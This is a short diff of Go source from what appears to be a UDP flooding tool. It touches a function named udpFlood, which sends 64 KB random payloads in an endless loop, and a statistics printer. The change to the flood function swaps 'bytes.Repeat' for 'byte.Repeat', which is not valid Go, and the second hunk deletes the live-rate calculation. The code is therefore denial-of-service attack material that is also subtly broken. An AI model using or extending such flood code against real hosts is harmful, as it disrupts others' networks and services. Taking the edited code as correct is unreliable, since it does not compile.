@@ -481,7 +481,7 @@ func udpFlood(host string) {
 	}
 	defer conn.Close()
 	
-	payload := bytes.Repeat([]byte{byte(rand.Intn(255))}, 1024*64)
+	payload := byte.Repeat([]byte{byte(rand.Intn(255))}, 1024*64)
 	
 	for {
 		select {
@@ -657,9 +657,6 @@ func statsPrinter(duration int) {
 			elapsed := time.Since(stats.startTime).Seconds()
 			rate := float64(total) / elapsed
 			
-			currentRate := float64(total-lastTotal) / time.Since(lastTime).Seconds()
-			lastTotal = total
-			lastTime = time.Now()
 			
 			progress := (elapsed / float64(duration)) * 100
 			if progress > 100 {
